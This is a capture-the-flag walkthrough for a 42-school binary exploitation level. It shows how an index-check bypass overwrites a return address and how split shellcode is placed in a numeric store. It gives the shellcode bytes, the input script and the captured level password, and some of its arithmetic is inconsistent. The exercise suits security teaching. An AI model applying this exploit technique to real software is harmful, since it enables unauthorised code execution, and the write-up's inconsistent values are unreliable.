# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    walkthrough                                        :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2019/05/22 21:41:18 by lgarczyn          #+#    #+#              #
#    Updated: 2019/05/22 21:54:39 by lgarczyn         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

The executable allows us to store ints nearly anywhere on the stack.

The store function:
	* takes a number n
	* takes an index i
	* if i is a multiple of 3
		* multiplies i by 4
		* stores n at i + array address

We try to overwrite the main return address using the store function.

We find it is offset by 464 bytes.

index = 464 / 4 = 114

But we receive the message: "address forbidden by wil", as i % 3 = 0.

We try to overwrite the printf plt.

offset from array to 0x0 = 0x2b9c
printf plt = 0x08048470
offset to printf plt = (0x08048470 + 0x2b9c) / 4 => 33631235

We use 'read' to check on the real binary
We get 2684626431, or 0xA00425FF, which is correct
We get a segfault on the real binary, indicating that the PLT is protected

We try again with the main return address.

Since the index is multiplied by 4, any number in the last 2 bits will overflow
0x80000000 + 114 = 0x80000072 = -2147483534
However, if the index is negative, the rightmost bit will be one-init
0x40000000 + 114 = 0x80000072 = 1073741938

We can't store our shellcode in env variable or user inputs.
We can however store it directly in the number storage.
Unfortunately, we can only use indexes not mutiples of 3.
So we write a shellcode that can have 4 bytes of abitrary data every 8 bytes,
using a relative 4-byte jump before each gap.

0:	90909090

1:	31c05090
2:	9090EB04

3:	90909090

4:	682f2f73
5:	6890EB04

6:	90909090

7:	682f6269
8:	6e90EB04

9:	90909090

10:	89e35053
11:	89e1EB04

12:	90909090

13:	b00bcd80

Here "EB04" increments the code pointer by one, then by the byte arg 0x04

We convert to int, minding the endian conversion

1:	2421211185
2:	82546832
4:	1932472168
5:	82546792
7:	1768042344
8:	82546798
10:	1397810057
11:	82567561
13:	1073741938

The address of our shellcode will be 0xffffd474 + 4 or 4294956152,
as we start at index one.
We create a simple script:

store
2421211185
1
store
82546832
2
store
1932472168
4
store
82546792
5
store
1768042344
7
store
82546798
8
store
1397810057
10
store
82567561
11
store
2160921520
13
store
4294956152
1073741938
quit

> cd ../level08
> cat .pass
< 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
